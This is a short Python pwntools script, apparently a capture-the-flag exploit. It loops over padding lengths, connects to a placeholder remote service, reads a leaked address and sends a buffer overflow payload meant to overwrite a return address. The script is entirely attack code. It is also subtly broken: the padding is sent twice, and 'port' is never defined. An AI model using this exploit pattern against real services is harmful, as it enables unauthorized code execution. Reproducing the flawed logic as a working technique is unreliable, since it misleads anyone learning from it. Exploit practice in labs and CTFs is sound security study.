from pwn import *
for i in range(300):
    p=remote("host",port)    
    p.recvuntil(b": ")
    offset=b"a"*i
    address=p.recvline().strip()
    p.recvline()
    payload=offset+p64(int(address,16))
    print(str(i)+": ")
    p.sendline(offset+payload)
    try:
        print(p.recvline())
    except:
        print("none")
    p.close()
